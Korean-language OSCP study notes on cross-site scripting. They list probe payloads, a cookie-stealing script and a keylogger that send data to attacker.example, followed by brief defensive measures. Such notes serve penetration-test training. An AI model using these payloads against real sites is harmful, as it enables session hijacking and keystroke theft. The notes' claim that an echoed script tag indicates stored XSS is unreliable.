# xss (Cross Site Scripting)

## 개요

XSS는 사용자 브라우저에 공격 스크립트를 주입하는 취약점이다. OSCP 시험의 웹 공격 단계에서 가장 기본적인 빈출 중 하나이며, 블라인드 XSS와 함께 연습한다.

## 기본 확인

```bash
# 주입 시도: 스크립트를 삽입
http://target/search?q=<script>alert('XSS')</script>
```

- `<script>` 태그가 응답에 그대로 내려가면 저장형 XSS의 가능성이 있다.
- `alert` 대신 최소한으로: `alert(document.cookie)` 정도로 시도해도 충분하다.

## 확인해야 할 형태

- 저장형: 입력값에 스크립트 저장 후 다른 사용자에게 노출
- 반사형: URL을 직접 열면 스크립트 실행 (XSS 발동 조건 확인)
- DOM 기반: `javascript:` URI, `onerror`/`onload` 속성

```html
<a href="javascript:alert(1)">CLICK</a>
<img src=x onerror=alert(1)>
```

## 세션 탈취

```html
<script>fetch('https://attacker.example/steal?cookie=' + btoa(document.cookie));</script>
```

- 쿠키를 읽어 다른 서버로 전송한다(세션 토큰 탈취).
- 이 정보는 이후 로그인에 재사용할 수 있다.

## 키 로거

```html
<script>
  document.onkeypress = function(e) {
    fetch('https://attacker.example/log?key=' + encodeURIComponent(e.key));
  };
</script>
```

## 방어

- 출력 시 `HttpOnly`, `Content-Security-Policy` 등을 사용해 스크립트 실행을 차단한다.
- 입력값은 HTML 엔코딩(`htmlspecialchars`)한다.
- OSCP에서는 기본적으로 XSS 문제를 열거하고, 저장형/반사형 중 발견되는 쪽을 파고든다.

## 실전 팁

- 인자가 쿼리스트링(`?`)인 경우 GET으로, 폼 데이터인 경우 POST로 시도한다.
- URL 디코딩되지 않은 값(예: `%3Cscript%3E`)이 내려오면 인코딩 우회를 시도한다.
- 확인 결과는 화면 녹화로 남겨두면 증적에서 재현 가능하게 재사용할 수 있다.